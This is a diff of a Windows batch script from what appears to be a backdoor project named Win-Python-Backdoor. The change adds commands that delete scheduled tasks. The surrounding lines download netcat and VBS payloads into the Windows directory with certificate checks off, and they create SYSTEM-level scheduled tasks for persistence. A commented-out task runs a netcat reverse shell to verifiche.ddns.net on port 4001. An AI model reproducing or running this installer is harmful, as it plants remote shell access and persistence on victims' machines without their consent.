@@ -43,7 +43,9 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
 rem wget --no-check-certificate %urlgit%/wup.exe  -O %windir%\wup.exe
 taskkill /f /im woffice.exe
-
+schtasks /delete /tn sys /F
+schtasks /delete /tn syskill /F
+schtasks /delete /tn office_get /F
 wget --no-check-certificate %urlgit%/nc64.exe  -O %windir%\nc64.exe
 rem wget --no-check-certificate %urlgit%/get.bat  -O %windir%\get.bat
 wget --no-check-certificate %urlgit%/get.vbs  -O %windir%\get.vbs
@@ -65,7 +67,7 @@ schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Def
 schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
 rem schtasks /create /tn sys /xml %windir%\sys.xml /F
 rem schtasks /create /tn syskill /xml %windir%\syskill.xml /F
-rem schtasks /delete /tn syskill /F
+
 
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im nc64.exe"  /tn syskill /rl highest /F
